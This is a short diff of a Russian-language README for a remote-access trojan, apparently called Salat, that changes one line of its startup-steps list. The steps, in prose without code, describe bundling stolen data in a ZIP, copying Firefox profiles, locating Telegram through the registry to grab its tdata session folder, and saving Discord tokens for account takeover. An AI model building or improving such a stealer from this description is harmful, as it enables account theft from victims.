@@ -8,7 +8,7 @@
 ## Основная работа подготовки программы к работе (кратко)
 
 1. Ратник создаёт ZIP-архив, и создает там файл UserInformation.txt, куда кладёт то время, в которое был запущен ратник.
-2. Сохраняет скриншот экранов (salat_screenshot_GetDisplayBounds.
+2. Сохраняет размер экранов (salat_screenshot_GetDisplayBounds | используется для панели, чтобы ходить по мониторам).
 3. Просматривает и сохраняет профили Mozilla Firefox если они есть (LocalCache\\Roaming\\Mozilla\\Firefox\\Profiles).
 4. Смотрит путь где находится Telegram с помощью реестра (HKEY_CURRENT_USER\\SOFTWARE\\Classes\\tg\\shell\\open\\command) и сохраняет папку tdata если она есть для входа в аккаунты (Clients\\tdata).
 5. Сохраняет Discord-токены для входа в аккаунты (Clients\\DiscordTokens.txt).
